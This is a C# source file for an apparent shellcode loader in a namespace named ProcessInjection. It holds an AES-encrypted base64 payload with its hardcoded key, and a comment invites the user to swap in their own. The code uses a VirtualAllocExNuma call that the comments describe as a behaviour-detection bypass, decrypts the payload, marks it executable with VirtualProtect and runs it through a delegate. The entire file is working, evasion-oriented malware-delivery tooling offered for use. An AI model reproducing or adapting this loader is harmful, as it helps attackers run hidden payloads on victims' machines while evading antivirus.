using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.IO;

namespace ProcessInjection
{
    class Program
    {
        public enum Protection
        {
            PAGE_NOACCESS = 0x01,
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_WRITECOPY = 0x08,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PAGE_EXECUTE_WRITECOPY = 0x80,
            PAGE_GUARD = 0x100,
            PAGE_NOCACHE = 0x200,
            PAGE_WRITECOMBINE = 0x400
        }

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        private delegate Int32 ShellcodeDelegate();

        static void Main(string[] args)
        {
            Shellcode();
        }

        static void Shellcode()
        {
            // attempt heuristics/behaviour bypass
            IntPtr mem = VirtualAllocExNuma(System.Diagnostics.Process.GetCurrentProcess().Handle, IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            // decrypt the base64 payload - change these to your own encrypted payload and key
            string payload = "sZkMiiTitR5hQL2YXTBgjq91qq0FuEqgfR7YiKt2N1IZ8vqW3q/BrIYTjBb7nKLXCsJM25sRqh+R9WHGNsTV8webqwx7ZfAYSvlmEmzIJcKaBVdJO+Lbr7h9RomrOdyaPUAZ6P49lnsZFF1fdvnFOg/WvSdKUrx/eKEt5sNBn/Jz43y26mDEwEEqseydPQHyBcT9Av/ZkTQC6GZU8D+pQhKvXNdnlGrHJk4+G25me/Hzr0P1YuX9ZpGbyXb/pLdmdViAGAPtA/OORVt6xmij4AY24j8SLocUs2A6lSJZHYD2C1+DIc1Lyw8UJ6dtNIU2xDtsHCWX0OlkcjU+QoYpCavs78Y+OePjyBwkryWTzMyuKBgAREjbQQdsIn6dQZeqk/tKI/l6Fmhu27V+wFX7mxUP/KXWf9PI/3QYiuLmkJCWFBL9sINPbLVLePFSke8Ik3t+vp5SIcM+wMufg+TXBdUNpE//gTgCpblXdJfkkqVpMFBxnfX2vYPDcFLWteiNsnHCn9REbVB3MqJe5T55tO/CLq1KkZ2R7Z7rra6H8OhJgOLKEdJ/XHdZV9IFatAtRW2dxVo49P2YFmux2WSDiKhVRoCuLMVM6PeTuzsN+2qV4Zrq6tRAVLwmmTn5uflWER1aScePh6+6utXW/0jS+Hz7KiGP2//8+YDwzYbkLJnfn9B4AdmE4BuNTJRrv7tumsxboNkmWOx87lVElzn5ZM9OP721s8LiSyfkD1zm4o9j2u80syPeEU3PXvOU1epBTsTjdwRWlAYF+wzv3olAjPzR/xojjB602MIUNeCPn4fqDp6NjEokELcgawbWNl1vKYo4QEYgtlhVmqIkk2ooz527AEQb5EWQhkaZEWr4AAmGO1YfvYDCTcfUwV9p/jkg";
            string key = "fjlmjiEgnQ4K6CjNCrPlqug1HW4icMec";

            byte[] buf = Decrypt(key, payload);

            unsafe
            {
                fixed(byte* ptr = buf)
                {
                    // set the memory as executable and execute the function pointer (as a delegate)
                    IntPtr memoryAddress = (IntPtr)ptr;
                    VirtualProtect(memoryAddress, (UIntPtr)buf.Length, (UInt32)Protection.PAGE_EXECUTE_READWRITE, out uint lpfOldProtect);

                    ShellcodeDelegate func = (ShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(ShellcodeDelegate));
                    func();
                }    
            }
        }

        private static byte[] Decrypt(string key, string aes_base64)
        {
            byte[] tempKey = Encoding.ASCII.GetBytes(key);
            tempKey = SHA256.Create().ComputeHash(tempKey);

            byte[] data = Convert.FromBase64String(aes_base64);

            // decrypt data
            Aes aes = new AesManaged();
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            ICryptoTransform dec = aes.CreateDecryptor(tempKey, SubArray(tempKey, 16));

            using (MemoryStream msDecrypt = new MemoryStream())
            {
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, dec, CryptoStreamMode.Write))
                {

                    csDecrypt.Write(data, 0, data.Length);

                    return msDecrypt.ToArray();
                }
            }
        }

        static byte[] SubArray(byte[] a, int length)
        {
            byte[] b = new byte[length];
            for (int i = 0; i < length; i++)
            {
                b[i] = a[i];
            }
            return b;
        }
    }
}
